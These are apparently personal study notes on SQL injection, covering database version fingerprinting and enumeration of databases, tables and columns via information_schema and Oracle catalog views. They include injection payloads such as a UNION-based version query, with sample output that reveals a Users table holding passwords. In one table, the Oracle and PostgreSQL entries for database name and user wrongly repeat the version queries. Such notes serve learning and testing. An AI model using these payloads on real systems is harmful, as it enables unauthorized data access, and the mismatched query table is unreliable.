## Querying the Database Type and Version
You can potentially identify both the database type and version by injecting provider-specific queries to see if one works. The following are some queries to determine the database version for some popular database servers:

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input `' UNION SELECT @@version--`. Which might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
```txt
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor
```
## Query the Database Name and User
You can potentially identify both the database name and user by injecting provider-specific queries to see if one works. The following are some queries for some popular database servers:

| Database type | Query                     |
| ------------- | ------------------------- |
| MySQL         | `SELECT database()`       |
| Oracle        | `SELECT * FROM v$version` |
| PostgreSQL    | `SELECT version()`        |
## Enumerating using `information_schema` Database
The `information_schema` database contains metadata about the database, tables, and columns present on the server, making it a crucial step for attackers to view or enumerate when performing SQL injection vulnerabilities.
> Note: Most databases have an `information_schema` present, except for Oracle databases.

There are a couple of ways an attacker can use the `information_schema` database to fingerprint the database:
### Query `schemata` Table to List All Databases
The table `schemata` in the `informatioN-schema` database contains information about all databases on the server. The `schema_name` column contains all the databases names currently present.
```sql
SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -
```
> Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).

>Note: This enumeration section is usually done by using the UNION operator. To know more about UNION attacks, refer to this [page](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FSQL%20Injection%2FUNION%20Attacks%2FIntroduction).
### Listing Contents of Databases
An attacker can also query the `tables` in the `information_schema` database to view information about all the tables throughout the database. This table contains multiple columns, but the `TABLE_NAME` and `TABLE_SCHEMA` are the most important ones as they store the table names and the table's associated database.
```sql
SELECT * FROM information_schema.tables
```
This returns the following output:
```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
Additionally, you can also inspect the table structure by submitting the following query:
```sql
SELECT * FROM information_schema.columns WHERE table_name='Users'
```
This returns the following output:
```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
### Listing Contents of Oracle Databases
On Oracle, you can find the same information as follows:
- You can list tables by querying `all_tables`:
```sql
SELECT * FROM all_tables
```
- You can list columns by querying `all_tab_columns`:
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```